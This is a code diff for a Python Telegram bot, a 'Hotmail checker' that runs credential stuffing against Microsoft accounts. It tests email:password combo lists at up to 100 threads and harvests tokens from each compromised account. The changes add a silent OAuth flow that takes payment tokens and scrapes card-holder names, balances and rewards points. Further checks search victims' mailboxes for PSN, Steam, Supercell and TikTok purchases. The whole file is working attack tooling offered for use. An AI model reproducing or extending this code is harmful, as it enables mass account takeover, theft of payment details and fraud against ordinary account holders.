@@ -25,6 +25,17 @@ combo_lines = []
 stop_checking = False
 current_message = None
 threads_count = 10
+selected_mode = "all"
+
+CHECK_MODES = {
+    "all": "ALL SERVICES",
+    "microsoft": "MICROSOFT/XBOX",
+    "psn": "PLAYSTATION",
+    "steam": "STEAM",
+    "supercell": "SUPERCELL",
+    "tiktok": "TIKTOK",
+    "minecraft": "MINECRAFT",
+}
 
 # Colors for terminal
 class Colors:
@@ -269,14 +280,17 @@ class LiveStats:
             if status == "HIT":
                 self.hits += 1
                 if result_data:
-                    if result_data.get('subscriptions'):
-                        active_subs = [s for s in result_data['subscriptions'] if not s.get('is_expired', False)]
-                        if active_subs:
+                    ms_status = result_data.get("ms_status")
+                    subscriptions = result_data.get("subscriptions", [])
+
+                    if ms_status in ("FREE", "PREMIUM") or subscriptions:
+                        active_subs = [s for s in subscriptions if not s.get('is_expired', False)]
+                        if ms_status == "PREMIUM" or active_subs:
                             self.premium += 1
                             self.xbox_premium += 1
                         else:
                             self.xbox_free += 1
-                    
+
                     if result_data.get('psn_orders', 0) > 0:
                         self.psn_hits += 1
                     if result_data.get('steam_count', 0) > 0:
@@ -303,16 +317,18 @@ class LiveStats:
         return elapsed, cpm, progress
     
     def should_update_telegram(self):
-        current_time = time.time()
-        if current_time - self.last_update_time >= 2 or self.checked == self.total:
-            self.last_update_time = current_time
-            return True
-        return False
+        with self.lock:
+            current_time = time.time()
+            if current_time - self.last_update_time >= 1 or self.checked == self.total:
+                self.last_update_time = current_time
+                return True
+            return False
 
 class HotmailChecker:
-    def __init__(self):
+    def __init__(self, check_mode="all"):
         self.session = requests.Session()
         self.uuid = str(uuid.uuid4())
+        self.check_mode = check_mode
         
     def get_remaining_days(self, date_str):
         try:
@@ -326,87 +342,123 @@ class HotmailChecker:
             return "0"
     
     def check_microsoft_subscriptions(self, access_token, cid):
-        """Check Xbox, Microsoft 365, and other Microsoft subscriptions"""
+        """Check Xbox, Microsoft 365, and other Microsoft subscriptions."""
         try:
-            subscriptions = []
+            user_id = str(uuid.uuid4()).replace('-', '')[:16]
+            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
+            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
             
-            # Try direct subscription check with access token
             headers = {
-                "Authorization": f"Bearer {access_token}",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+                "Host": "login.live.com",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Connection": "keep-alive",
+                "Referer": "https://account.microsoft.com/"
             }
             
-            r_subs = self.session.get(
-                "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
-                headers=headers, timeout=15
-            )
+            r = self.session.get(payment_auth_url, headers=headers, allow_redirects=True, timeout=20)
+            payment_token = None
+            search_text = r.text + " " + r.url
             
-            if r_subs.status_code == 200:
-                text = r_subs.text
-                
-                # Check for Xbox Game Pass
-                if "Xbox Game Pass Ultimate" in text:
-                    subscriptions.append({
-                        'name': 'GAME PASS ULTIMATE',
-                        'category': 'gaming',
-                        'is_expired': False
-                    })
-                if "PC Game Pass" in text:
-                    subscriptions.append({
-                        'name': 'PC GAME PASS',
-                        'category': 'gaming',
-                        'is_expired': False
-                    })
-                if "Xbox Game Pass" in text and "Ultimate" not in text and "PC" not in text:
-                    subscriptions.append({
-                        'name': 'GAME PASS',
-                        'category': 'gaming',
-                        'is_expired': False
-                    })
-                
-                # Check for Microsoft 365
-                if "Microsoft 365 Family" in text:
-                    subscriptions.append({
-                        'name': 'M365 FAMILY',
-                        'category': 'office',
-                        'is_expired': False
-                    })
-                if "Microsoft 365 Personal" in text:
-                    subscriptions.append({
-                        'name': 'M365 PERSONAL',
-                        'category': 'office',
-                        'is_expired': False
-                    })
-                if "Office 365" in text:
-                    subscriptions.append({
-                        'name': 'OFFICE 365',
-                        'category': 'office',
-                        'is_expired': False
-                    })
-                
-                # Check for EA Play
-                if "EA Play" in text:
-                    subscriptions.append({
-                        'name': 'EA PLAY',
-                        'category': 'gaming',
-                        'is_expired': False
-                    })
-                
-                # Check for Xbox Live Gold
-                if "Xbox Live Gold" in text:
-                    subscriptions.append({
-                        'name': 'XBOX LIVE GOLD',
-                        'category': 'gaming',
-                        'is_expired': False
-                    })
+            token_patterns = [
+                r'access_token=([^&\s"\']+)',
+                r'"access_token":"([^"]+)"'
+            ]
             
-            return subscriptions
+            for pattern in token_patterns:
+                match = re.search(pattern, search_text)
+                if match:
+                    payment_token = unquote(match.group(1))
+                    break
+            
+            sub_data = {}
+            subscriptions = []
+            
+            if payment_token:
+                payment_headers = {
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                    "Accept": "application/json",
+                    "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
+                    "Content-Type": "application/json",
+                    "Host": "paymentinstruments.mp.microsoft.com",
+                    "ms-cV": str(uuid.uuid4()),
+                    "Origin": "https://account.microsoft.com",
+                    "Referer": "https://account.microsoft.com/"
+                }
+                
+                try:
+                    payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
+                    r_pay = self.session.get(payment_url, headers=payment_headers, timeout=15)
+                    if r_pay.status_code == 200:
+                        balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r_pay.text)
+                        if balance_match:
+                            sub_data['balance'] = "$" + balance_match.group(1)
+                        card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r_pay.text, re.DOTALL)
+                        if card_match:
+                            sub_data['card_holder'] = card_match.group(1)
+                except:
+                    pass
+                
+                try:
+                    rewards_r = self.session.get("https://rewards.bing.com/", timeout=10)
+                    points_match = re.search(r'"availablePoints"\s*:\s*(\d+)', rewards_r.text)
+                    if points_match:
+                        sub_data['rewards_points'] = points_match.group(1)
+                except:
+                    pass
+                
+                try:
+                    trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
+                    r_sub = self.session.get(trans_url, headers=payment_headers, timeout=15)
+                    
+                    if r_sub.status_code == 200:
+                        response_text = r_sub.text
+                        subscription_keywords = {
+                            'Xbox Game Pass Ultimate': {'type': 'GAME PASS ULTIMATE', 'category': 'gaming'},
+                            'PC Game Pass': {'type': 'PC GAME PASS', 'category': 'gaming'},
+                            'Xbox Game Pass': {'type': 'GAME PASS', 'category': 'gaming'},
+                            'EA Play': {'type': 'EA PLAY', 'category': 'gaming'},
+                            'Xbox Live Gold': {'type': 'XBOX LIVE GOLD', 'category': 'gaming'},
+                            'Microsoft 365 Family': {'type': 'M365 FAMILY', 'category': 'office'},
+                            'Microsoft 365 Personal': {'type': 'M365 PERSONAL', 'category': 'office'},
+                            'Office 365': {'type': 'OFFICE 365', 'category': 'office'},
+                            'OneDrive': {'type': 'ONEDRIVE', 'category': 'storage'},
+                        }
+                        
+                        for keyword, info in subscription_keywords.items():
+                            if keyword in response_text:
+                                sub_info = {
+                                    'name': info['type'],
+                                    'category': info['category']
+                                }
+                                
+                                renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
+                                if renewal_match:
+                                    renewal_date = renewal_match.group(1)
+                                    sub_info['renewal_date'] = renewal_date
+                                    sub_info['days_remaining'] = self.get_remaining_days(renewal_date + "T00:00:00Z")
+                                    try:
+                                        if int(sub_info['days_remaining']) < 0:
+                                            sub_info['is_expired'] = True
+                                    except:
+                                        pass
+                                
+                                subscriptions.append(sub_info)
+                except:
+                    pass
+            active_subs = [s for s in subscriptions if not s.get('is_expired', False)]
+            return {
+                "status": "PREMIUM" if active_subs else "FREE",
+                "subscriptions": subscriptions,
+                "data": sub_data
+            }
             
         except Exception as e:
-            return []
+            return {"status": "ERROR", "subscriptions": [], "data": {}}
     
     def check_psn(self, access_token, cid):
-        """Check PlayStation Network orders"""
+        """Check PlayStation Network orders - Exact copy from API"""
         try:
             search_url = "https://outlook.live.com/search/api/v2/query"
             
@@ -453,7 +505,7 @@ class HotmailChecker:
             return 0
     
     def check_steam(self, access_token, cid):
-        """Check Steam purchases"""
+        """Check Steam purchases - Exact copy from API"""
         try:
             search_url = "https://outlook.live.com/search/api/v2/query"
             
@@ -500,7 +552,7 @@ class HotmailChecker:
             return 0
     
     def check_supercell(self, access_token, cid):
-        """Check Supercell games"""
+        """Check Supercell games - Exact copy from API"""
         try:
             games = ["Clash of Clans", "Clash Royale", "Brawl Stars", "Hay Day", "Boom Beach"]
             found_games = []
@@ -552,7 +604,7 @@ class HotmailChecker:
             return []
     
     def check_tiktok(self, access_token, cid):
-        """Check TikTok account"""
+        """Check TikTok account - Exact copy from API"""
         try:
             search_url = "https://outlook.live.com/search/api/v2/query"
             
@@ -601,7 +653,7 @@ class HotmailChecker:
             return None
     
     def check_minecraft(self, access_token):
-        """Check Minecraft account"""
+        """Check Minecraft account - Exact copy from API"""
         try:
             r = self.session.get(
                 "https://api.minecraftservices.com/minecraft/profile",
@@ -641,7 +693,7 @@ class HotmailChecker:
         return None
     
     def check(self, email, password):
-        """Main check function - exact copy from API code"""
+        """Main check function - Exact copy from API"""
         try:
             # Step 1: Get IDP
             url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
@@ -740,25 +792,46 @@ class HotmailChecker:
             token_json = r4.json()
             access_token = token_json["access_token"]
             
-            # Check all services
-            subscriptions = self.check_microsoft_subscriptions(access_token, cid)
-            psn_orders = self.check_psn(access_token, cid)
-            steam_count = self.check_steam(access_token, cid)
-            supercell_games = self.check_supercell(access_token, cid)
-            tiktok_username = self.check_tiktok(access_token, cid)
-            minecraft_username = self.check_minecraft(access_token)
-            
             result = {
                 "status": "HIT",
                 "email": email,
-                "password": password,
-                "subscriptions": subscriptions,
-                "psn_orders": psn_orders,
-                "steam_count": steam_count,
-                "supercell_games": supercell_games,
-                "tiktok_username": tiktok_username,
-                "minecraft_username": minecraft_username
+                "password": password
             }
+
+            if self.check_mode in ["microsoft", "all"]:
+                ms_result = self.check_microsoft_subscriptions(access_token, cid)
+                result["ms_status"] = ms_result.get("status", "FREE")
+                result["subscriptions"] = ms_result.get("subscriptions", [])
+                result["ms_data"] = ms_result.get("data", {})
+            else:
+                result["ms_status"] = "SKIPPED"
+                result["subscriptions"] = []
+                result["ms_data"] = {}
+
+            if self.check_mode in ["psn", "all"]:
+                result["psn_orders"] = self.check_psn(access_token, cid)
+            else:
+                result["psn_orders"] = 0
+
+            if self.check_mode in ["steam", "all"]:
+                result["steam_count"] = self.check_steam(access_token, cid)
+            else:
+                result["steam_count"] = 0
+
+            if self.check_mode in ["supercell", "all"]:
+                result["supercell_games"] = self.check_supercell(access_token, cid)
+            else:
+                result["supercell_games"] = []
+
+            if self.check_mode in ["tiktok", "all"]:
+                result["tiktok_username"] = self.check_tiktok(access_token, cid)
+            else:
+                result["tiktok_username"] = None
+
+            if self.check_mode in ["minecraft", "all"]:
+                result["minecraft_username"] = self.check_minecraft(access_token)
+            else:
+                result["minecraft_username"] = None
             
             return result
             
@@ -767,9 +840,10 @@ class HotmailChecker:
         except Exception as e:
             return {"status": "ERROR"}
 
-def generate_status_message(stats):
+def generate_status_message(stats, mode_label):
     elapsed, cpm, progress = stats.get_progress()
     time_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
+    hit_rate = (stats.hits / stats.checked * 100) if stats.checked else 0
     
     unique_id = int(time.time() * 1000) % 10000
     
@@ -777,10 +851,12 @@ def generate_status_message(stats):
 <b>🔥 HOTMAIL CHECKER 🔥</b>
 ━━━━━━━━━━━━━━━━━━━━━━━
 <b>Status:</b> 🟢 CHECKING...
+<b>Mode:</b> {mode_label}
 
 <b>✓ True:</b> {stats.hits}
 <b>✗ Bad:</b> {stats.bads}
 <b>🔐 2FA:</b> {stats.twofa}
+<b>🎯 Hit Rate:</b> {hit_rate:.1f}%
 ━━━━━━━━━━━━━━━━━━━━━━━
 <b>🎮 Xbox Free:</b> {stats.xbox_free}
 <b>🎮 Xbox Premium:</b> {stats.xbox_premium}
@@ -801,12 +877,71 @@ def generate_status_message(stats):
 """
     return message
 
+
+def generate_quick_summary(stats, total_lines, mode_label):
+    elapsed, cpm, _ = stats.get_progress()
+    time_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
+    return f"""
+<b>📌 QUICK SUMMARY</b>
+━━━━━━━━━━━━━━━━━━━━━━━
+<b>Mode:</b> {mode_label}
+<b>✓ True:</b> {stats.hits}
+<b>🔐 2FA:</b> {stats.twofa}
+<b>✗ Bad:</b> {stats.bads}
+<b>🎮 Xbox Premium:</b> {stats.xbox_premium}
+<b>🎯 PSN:</b> {stats.psn_hits}
+<b>🎲 Steam:</b> {stats.steam_hits}
+<b>⚔️ Supercell:</b> {stats.supercell_hits}
+<b>📱 TikTok:</b> {stats.tiktok_hits}
+<b>⛏️ Minecraft:</b> {stats.minecraft_hits}
+━━━━━━━━━━━━━━━━━━━━━━━
+<b>📊 Total:</b> {stats.checked}/{total_lines}
+<b>⚡ Speed:</b> {cpm:.0f} CPM | <b>⏱️ Time:</b> {time_str}
+"""
+
+
+def build_setup_keyboard():
+    markup = InlineKeyboardMarkup(row_width=3)
+    markup.add(
+        InlineKeyboardButton("All", callback_data="mode_all"),
+        InlineKeyboardButton("Microsoft", callback_data="mode_microsoft"),
+        InlineKeyboardButton("PSN", callback_data="mode_psn"),
+    )
+    markup.add(
+        InlineKeyboardButton("Steam", callback_data="mode_steam"),
+        InlineKeyboardButton("Supercell", callback_data="mode_supercell"),
+        InlineKeyboardButton("TikTok", callback_data="mode_tiktok"),
+    )
+    markup.add(InlineKeyboardButton("Minecraft", callback_data="mode_minecraft"))
+
+    thread_buttons = [InlineKeyboardButton(str(i), callback_data=f"threads_{i}") for i in range(1, 11)]
+    markup.add(*thread_buttons[:5])
+    markup.add(*thread_buttons[5:])
+    markup.add(
+        InlineKeyboardButton("20", callback_data="threads_20"),
+        InlineKeyboardButton("40", callback_data="threads_40"),
+        InlineKeyboardButton("60", callback_data="threads_60"),
+        InlineKeyboardButton("80", callback_data="threads_80"),
+        InlineKeyboardButton("100", callback_data="threads_100"),
+    )
+    return markup
+
+
+def build_running_keyboard():
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_status"),
+        InlineKeyboardButton("📌 SUMMARY", callback_data="summary_now"),
+    )
+    markup.add(InlineKeyboardButton("⛔ STOP CHECKING", callback_data="stop_check"))
+    return markup
+
 def check_process():
-    global checking_active, stop_checking, stats, result_mgr, current_message, threads_count
+    global checking_active, stop_checking, stats, result_mgr, current_message, threads_count, selected_mode
     
     try:
         valid_combos = []
-        checker = HotmailChecker()
+        checker = HotmailChecker(check_mode=selected_mode)
         
         for line in combo_lines:
             if stop_checking:
@@ -820,9 +955,9 @@ def check_process():
         
         print(f"\n{Colors.GREEN}✅ Started checking {total_lines} accounts with {threads_count} threads{Colors.END}\n")
         
-        status_msg = generate_status_message(stats)
-        markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("⛔ STOP CHECKING", callback_data="stop_check"))
+        mode_label = CHECK_MODES.get(selected_mode, "ALL SERVICES")
+        status_msg = generate_status_message(stats, mode_label)
+        markup = build_running_keyboard()
         
         current_message = bot.edit_message_text(
             status_msg,
@@ -837,28 +972,14 @@ def check_process():
             
             email, password = account
             stats.set_current(email)
-            
-            print_terminal_status(stats)
-            
-            if stats.should_update_telegram():
-                try:
-                    status_msg = generate_status_message(stats)
-                    safe_edit_message(
-                        ADMIN_ID,
-                        current_message.message_id,
-                        status_msg,
-                        markup
-                    )
-                except:
-                    pass
-            
-            result = checker.check(email, password)
+            local_checker = HotmailChecker(check_mode=selected_mode)
+            result = local_checker.check(email, password)
             
             if result["status"] == "HIT":
                 stats.update("HIT", result)
                 result_mgr.save_result(email, password, "HIT", result)
                 
-                # Print hit with details in organized format
+                # Print hit with details
                 details = []
                 if result.get('subscriptions'):
                     for sub in result['subscriptions']:
@@ -884,12 +1005,25 @@ def check_process():
             else:
                 stats.update("BAD")
                 result_mgr.save_result(email, password, "BAD")
+
+            print_terminal_status(stats)
+            if stats.should_update_telegram():
+                try:
+                    status_msg = generate_status_message(stats, mode_label)
+                    safe_edit_message(
+                        ADMIN_ID,
+                        current_message.message_id,
+                        status_msg,
+                        markup
+                    )
+                except:
+                    pass
         
         with ThreadPoolExecutor(max_workers=threads_count) as executor:
             executor.map(process_account, valid_combos)
         
         time.sleep(1)
-        status_msg = generate_status_message(stats)
+        status_msg = generate_status_message(stats, mode_label)
         safe_edit_message(ADMIN_ID, current_message.message_id, status_msg, markup)
         
         print(f"\n\n{Colors.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}")
@@ -907,6 +1041,7 @@ def check_process():
         final_message += f"""
 <b>📊 FINAL RESULTS</b>
 ━━━━━━━━━━━━━━━━━━━━━━━
+<b>Mode:</b> {mode_label}
 <b>✓ True:</b> {stats.hits}
 <b>✗ Bad:</b> {stats.bads}
 <b>🔐 2FA:</b> {stats.twofa}
@@ -988,7 +1123,7 @@ def start_command(message):
 
 @bot.message_handler(content_types=['document'])
 def handle_document(message):
-    global checking_active, result_mgr, combo_lines, current_message, threads_count
+    global checking_active, result_mgr, combo_lines, current_message, threads_count, selected_mode
     
     if message.from_user.id != ADMIN_ID:
         return
@@ -1020,13 +1155,8 @@ def handle_document(message):
         print(f"{Colors.WHITE}Total lines: {len(combo_lines)}{Colors.END}")
         print(f"{Colors.GREEN}Valid combos: {valid_count}{Colors.END}")
         
-        markup = InlineKeyboardMarkup(row_width=5)
-        buttons = []
-        for i in range(1, 11):
-            buttons.append(InlineKeyboardButton(str(i), callback_data=f"threads_{i}"))
-        for i in range(20, 101, 20):
-            buttons.append(InlineKeyboardButton(str(i), callback_data=f"threads_{i}"))
-        markup.add(*buttons)
+        selected_label = CHECK_MODES.get(selected_mode, "ALL SERVICES")
+        markup = build_setup_keyboard()
         
         msg = f"""
 <b>📁 FILE RECEIVED</b>
@@ -1034,9 +1164,11 @@ def handle_document(message):
 <b>File:</b> {file_name[:30]}
 <b>Total lines:</b> {len(combo_lines)}
 <b>Valid combos:</b> {valid_count}
+<b>Mode:</b> {selected_label}
 ━━━━━━━━━━━━━━━━━━━━━━━
 
-<b>⚙️ Select number of threads (1-100):</b>
+<b>1) Select check mode (optional)</b>
+<b>2) Select threads to start (1-100)</b>
 """
         bot.reply_to(message, msg, reply_markup=markup)
         
@@ -1046,23 +1178,40 @@ def handle_document(message):
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callback(call):
-    global checking_active, threads_count, result_mgr, current_message, stop_checking
+    global checking_active, threads_count, result_mgr, current_message, stop_checking, selected_mode, stats
     
     if call.from_user.id != ADMIN_ID:
         bot.answer_callback_query(call.id, "⛔ Unauthorized")
         return
     
-    if call.data.startswith("threads_"):
+    if call.data.startswith("mode_"):
+        selected_mode = call.data.replace("mode_", "", 1)
+        selected_label = CHECK_MODES.get(selected_mode, "ALL SERVICES")
+        try:
+            updated_text = call.message.text
+            if "<b>Mode:</b>" in updated_text:
+                updated_text = re.sub(r"<b>Mode:</b>.*", f"<b>Mode:</b> {selected_label}", updated_text)
+            safe_edit_message(
+                ADMIN_ID,
+                call.message.message_id,
+                updated_text,
+                build_setup_keyboard()
+            )
+        except:
+            pass
+        bot.answer_callback_query(call.id, f"✅ Mode: {selected_label}")
+
+    elif call.data.startswith("threads_"):
         threads_count = int(call.data.split("_")[1])
         result_mgr = ResultManager(f"combo_{int(time.time())}")
         
         checking_active = True
         stop_checking = False
         
+        mode_label = CHECK_MODES.get(selected_mode, "ALL SERVICES")
         stats = LiveStats(len(combo_lines))
-        status_msg = generate_status_message(stats)
-        markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("⛔ STOP CHECKING", callback_data="stop_check"))
+        status_msg = generate_status_message(stats, mode_label)
+        markup = build_running_keyboard()
         
         current_message = bot.edit_message_text(
             status_msg,
@@ -1071,12 +1220,29 @@ def handle_callback(call):
             reply_markup=markup
         )
         
-        print(f"{Colors.GREEN}✅ Starting check with {threads_count} threads{Colors.END}")
+        print(f"{Colors.GREEN}✅ Starting check with {threads_count} threads | Mode: {mode_label}{Colors.END}")
         
         thread = Thread(target=check_process)
         thread.daemon = True
         thread.start()
-        bot.answer_callback_query(call.id, f"✅ Started with {threads_count} threads")
+        bot.answer_callback_query(call.id, f"✅ Started: {mode_label} | {threads_count} threads")
+
+    elif call.data == "refresh_status":
+        if checking_active and stats and current_message:
+            mode_label = CHECK_MODES.get(selected_mode, "ALL SERVICES")
+            status_msg = generate_status_message(stats, mode_label)
+            safe_edit_message(ADMIN_ID, current_message.message_id, status_msg, build_running_keyboard())
+            bot.answer_callback_query(call.id, "🔄 Refreshed")
+        else:
+            bot.answer_callback_query(call.id, "❌ No active check")
+
+    elif call.data == "summary_now":
+        if checking_active and stats:
+            mode_label = CHECK_MODES.get(selected_mode, "ALL SERVICES")
+            bot.send_message(ADMIN_ID, generate_quick_summary(stats, len(combo_lines), mode_label))
+            bot.answer_callback_query(call.id, "📌 Summary sent")
+        else:
+            bot.answer_callback_query(call.id, "❌ No active check")
         
     elif call.data == "stop_check":
         if checking_active:
